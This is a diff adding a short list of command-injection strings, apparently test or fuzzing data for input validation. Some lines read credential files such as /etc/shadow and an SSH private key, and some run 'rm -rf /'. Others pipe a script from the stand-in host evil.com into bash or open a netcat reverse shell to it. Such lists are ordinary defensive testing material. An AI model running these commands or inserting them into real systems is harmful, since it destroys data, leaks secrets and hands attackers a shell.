@@ -1,0 +1,16 @@
+; cat /etc/passwd
+&& curl evil.com/script.sh | bash
+| nc -e /bin/bash evil.com 4444
+`cat /root/.ssh/id_rsa`
+$(rm -rf /)
+$(curl http://malicious.com/exploit)
+bash -c "cat /etc/shadow"
+sh -c "rm -rf /tmp && mkdir /tmp/exploit"
+eval("malicious_code()")
+exec("dangerous_command")
+system("rm -rf /")
+popen("cat /etc/passwd")
+python -c "import os; os.system('rm -rf /')"
+perl -e "system('cat /etc/passwd')"
+php -r "system('rm -rf /')"
+node -e "require('child_process').exec('cat /etc/passwd')"
